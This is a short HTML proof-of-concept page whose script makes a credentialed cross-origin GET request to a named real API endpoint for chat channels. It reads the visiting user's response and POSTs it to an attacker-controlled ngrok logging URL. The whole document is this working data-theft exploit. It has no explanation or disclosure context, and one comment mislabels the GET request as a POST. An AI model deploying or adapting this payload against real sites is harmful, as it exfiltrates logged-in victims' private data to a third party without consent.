<h1>PoC</h1>

<script>
    // Define the target URL
    var targetUrl = 'https://api.teemill.com/v1/chat/channels';

    // Create a new XMLHttpRequest
    var req = new XMLHttpRequest();

    // Define the callback function for when the request is complete
    req.onload = function () {
        var responseData = this.responseText;

        // Optional: Trim the response if it's too large (e.g., 2MB max)
        var maxSize = 2 * 1024 * 1024; // 2MB in bytes
        if (responseData.length > maxSize) {
            responseData = responseData.slice(0, maxSize); // Trim to max size
        }

        // Send the actual response data to your logging endpoint as JSON
        var logReq = new XMLHttpRequest();
        logReq.open('POST', 'https://121c-2600-3c03-00-f03c-95ff-fe98-8b2e.ngrok-free.app/log', true);
        logReq.setRequestHeader('Content-Type', 'application/json');

        // Send the data as JSON
        var payload = JSON.stringify({ key: responseData });
        logReq.send(payload);
    };

    // Configure the request to the target URL as a POST
    req.open('GET', targetUrl, true);

    // Enable sending credentials (cookies, etc.)
    req.withCredentials = true;

    // Send the request with no payload
    req.send();
</script>
